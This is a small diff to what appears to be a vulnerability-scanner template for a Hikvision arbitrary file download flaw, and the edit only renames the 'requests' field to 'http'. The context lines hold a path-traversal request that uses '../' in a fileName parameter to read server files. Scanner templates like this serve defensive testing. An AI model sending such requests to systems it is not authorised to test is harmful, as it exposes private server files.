@@ -8,7 +8,7 @@ info:
     - https://blockchain.seebug.org/vuldb/ssvid-91769
   tags: hikvision,download
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php"
